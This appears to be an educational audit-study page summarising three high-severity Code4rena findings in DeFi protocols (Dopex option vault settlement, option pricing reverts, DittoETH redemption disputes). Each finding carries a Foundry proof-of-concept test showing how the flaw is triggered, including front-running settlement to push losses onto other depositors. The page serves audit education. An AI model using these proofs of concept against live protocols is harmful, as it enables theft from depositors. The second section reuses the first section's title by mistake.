# ETAAcademy-Adudit: 6. Option

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>06. Option</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>option</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] Put settlement can be anticipated and lead to user losses and bonding DoS

### Put settlement

- Summary: Liquidity providers in PerpetualAtlanticVaultLP can anticipate potential losses from in-the-money put options, allowing them to withdraw liquidity before losses occur. This creates a disadvantage for slower or less technically savvy users. The issue is rooted in the predictability of settlement price thresholds and the LPs' ability to redeem collateral at any time, potentially draining available collateral and hindering market participation for other users.

- Impact & Recommendation: The severity is high because new depositors face guaranteed losses without a clear solution. Possible fixes include implementing a "cooling off period" for withdrawals or minting more shares to reward long-term holders, but both options impact the project's token economics.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-02-put-settlement-can-be-anticipated-and-lead-to-user-losses-and-bonding-dos) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.19;
    import { Test } from "forge-std/Test.sol";
    import "forge-std/console.sol";
    import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
    import { Setup } from "./Setup.t.sol";
    import { PerpetualAtlanticVault } from "contracts/perp-vault/PerpetualAtlanticVault.sol";
    contract PoC is ERC721Holder, Setup {
    // ================================ HELPERS ================================ //
    function mintWeth(uint256 _amount, address _to) public {
        weth.mint(_to, _amount);
    }
    function mintRdpx(uint256 _amount, address _to) public {
        rdpx.mint(_to, _amount);
    }
    function deposit(uint256 _amount, address _from) public {
        vm.startPrank(_from, _from);
        vaultLp.deposit(_amount, _from);
        vm.stopPrank();
    }
    function purchase(uint256 _amount, address _as) public returns (uint256 id) {
        vm.startPrank(_as, _as);
        (, id) = vault.purchase(_amount, _as);
        vm.stopPrank();
    }
    function setApprovals(address _as) public {
        vm.startPrank(_as, _as);
        rdpx.approve(address(vault), type(uint256).max);
        rdpx.approve(address(vaultLp), type(uint256).max);
        weth.approve(address(vault), type(uint256).max);
        weth.approve(address(vaultLp), type(uint256).max);
        vm.stopPrank();
    }
    // ================================ CORE ================================ //
    /**
    Assumptions & config:
        - address(this) is impersonating the rdpxV2Core contract
        - premium per option: 0.05 weth
        - epoch duration: 1 day; 86400 seconds
        - initial price of rdpx: 0.2 weth
        - pricing precision is in 0.1 gwei
        - premium precision is in 0.1 gwei
        - rdpx and weth denomination in wei
    **/
    function testPoCHigh3() external {
        // Setup starts here ----------------------------->
        setApprovals(address(1));
        setApprovals(address(2));
        setApprovals(address(3));
        mintWeth(5 ether, address(1));
        mintWeth(5 ether, address(2));
        mintWeth(25 ether, address(3));
        /// The users deposit
        deposit(5 ether, address(1));
        deposit(5 ether, address(2));
        deposit(25 ether, address(3));
        uint256 userBalance = vaultLp.balanceOf(address(1));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(2));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(3));
        assertEq(userBalance, 25 ether);
        // premium = 100 * 0.05 weth = 5 weth
        uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated
        skip(86500); // expires epoch 1
        vault.updateFunding();
        vault.updateFundingPaymentPointer();
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 0.015 gwei;
        uint256 fundingAccrued = vault.calculateFunding(strikes);
        assertEq(fundingAccrued, 5 ether);
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        /// ---------------- POC STARTS HERE ---------------------------------------------------///
        // At this point the Core contract has purchased options to sell 100 rdpx tokens
        // The market moves against `rdpx` and the puts are now in the money
        priceOracle.updateRdpxPrice(0.010 gwei);
        // Bob, a savvy user, sees there is collateral available to withdraw, and
        // because he monitors the price he knows the vault is about to take a loss
        // thus, he withdraws his capital, expecting a call to settle.
        userBalance = vaultLp.balanceOf(address(1));
        vm.startPrank(address(1));
        vaultLp.redeem(userBalance, address(1), address(1));
        vm.stopPrank();
        vm.startPrank(address(this), address(this));
        (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);
        vm.stopPrank();
        // Bob now re-enters the LP Vault
        vm.startPrank(address(1));
        vaultLp.deposit(weth.balanceOf(address(1)), address(1));
        vm.stopPrank();
        // Now we tally up the scores
        console.log("User Bob ends with (WETH, RDPX, Shares):");
        userBalance = vaultLp.balanceOf(address(1));
        (uint256 aBob, uint256 bBob) = vaultLp.redeemPreview(userBalance);
        console.log(aBob, bBob, userBalance);
        userBalance = vaultLp.balanceOf(address(2));
        (uint256 aDave, uint256 bDave) = vaultLp.redeemPreview(userBalance);
        console.log("User Dave ends with (WETH, RDPX, Shares):");
        console.log(aDave, bDave, userBalance);
        /**
            Bob and Dave both started with 5 ether deposited into the vault LP.
            Bob ends up with shares worth 4.08 WETH + 16.32 RDPX
            Dave ends up with shares worth 3.48 WETH + 13.94 RDPX
            Thus we can conclude that by anticipating calls to `settle`,
            either by monitoring the market or through front-running,
            Bob has forced Dave to take on more of the losses.
        */
    }
    }

  ```

  </details>

## 2.[High] Put settlement can be anticipated and lead to user losses and bonding DoS

### Set minimum  timeToExpiry

- Summary: The problem occurs in the PerpetualAtlanticVault contract when attempting to purchase options. If the time difference between the next funding payment and the current block time is less than 864 seconds, it causes the option pricing to use a time to expiry of 0, resulting in a revert. This leads to unexpected reverts approximately every 14 minutes during each funding epoch.

- Impact & Recommendation: Set minimum  timeToExpiry  inside  calculatePremium.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-06-bond-operations-will-always-revert-at-certain-time-when-putoptionsrequired-is-true) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
      function testOptionPricingRevert() public {
        OptionPricingSimple optionPricingSimple;
        optionPricingSimple = new OptionPricingSimple(100, 5e6);
        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);
        uint256 currentPrice = vault.getUnderlyingPrice(); // price of underlying wrt collateralToken
        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
        // around 14 minutes before next funding payment
        vm.warp(block.timestamp + 7 days - 863 seconds);
        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is the current price");
        console.log(currentPrice);
        console.log("What is the strike");
        console.log(strike);
        console.log("What is time to expiry");
        console.log(timeToExpiry);
        uint256 price = vault.getUnderlyingPrice();
        // will revert
        vm.expectRevert();
        optionPricingSimple.getOptionPrice(strike, price, 100, timeToExpiry);
    }

  ```

  </details>

## 3.[High] Closing a SR during a wrong redemption proposal leads to loss of funds

### Collateral added to closed SR by disputed Redemption

- Summary: A vulnerability in the DittoETH protocol can lead to a loss of funds when closing a Short Record (SR) during a wrong redemption proposal. When a user creates a redemption proposal with the proposeRedemption function, they must provide a list of SRs with the lowest collateral ratios (CR) in ascending order. If the list is incorrect, anyone can dispute it using the disputeRedemption function. However, if an SR is closed (due to liquidation, exiting, or transfer) between proposing and disputing, its collateral is added to the closed SR and cannot be recovered.

- Impact & Recommendation: Reopening closed SRs could resolve the issue but might be misused to avoid liquidations.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-dittoeth#h-06-closing-a-sr-during-a-wrong-redemption-proposal-leads-to-loss-of-funds) & [Report](https://code4rena.com/reports/2024-03-dittoeth)

<details><summary>POC</summary>

```solidity
function test_dispute_on_non_existing_sr() public {
    // setup shorts
    makeShorts({singleShorter: true});
    _setETH(1000 ether);
    skip(1 hours);
    STypes.ShortRecord memory sr1 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID);
    STypes.ShortRecord memory sr2 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+1);
    STypes.ShortRecord memory sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
    uint256 cr1 = diamond.getCollateralRatio(asset, sr1);
    uint256 cr2 = diamond.getCollateralRatio(asset, sr2);
    uint256 cr3 = diamond.getCollateralRatio(asset, sr3);
    // CRs are increasing
    assertGt(cr2, cr1);
    assertGt(cr3, cr2);
    // user creates a wrong proposal
    MTypes.ProposalInput[] memory proposalInputs =
        makeProposalInputsForDispute({shortId1: C.SHORT_STARTING_ID + 1, shortId2: C.SHORT_STARTING_ID + 2});
    address redeemer = receiver;
    vm.prank(redeemer);
    diamond.proposeRedemption(asset, proposalInputs, DEFAULT_AMOUNT * 3 / 2, MAX_REDEMPTION_FEE);
    // on of the SRs in the proposal is closed
    fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT / 2, extra);
    exitShort(C.SHORT_STARTING_ID + 2, DEFAULT_AMOUNT / 2, DEFAULT_PRICE, sender);
    // SR is now closed
    sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
    assertEq(uint(sr3.status), uint(SR.Closed));
    uint88 collateralBefore = sr3.collateral;
    // another user disputes the wrong proposal
    address disputer = extra;
    vm.prank(disputer);
    diamond.disputeRedemption({
        asset: asset,
        redeemer: redeemer,
        incorrectIndex: 0,
        disputeShorter: sender,
        disputeShortId: C.SHORT_STARTING_ID
    });
    // SR is still closed and collateral increased
    sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
    assertEq(uint(sr3.status), uint(SR.Closed));
    assertGt(sr3.collateral, collateralBefore);
}

```

</details>
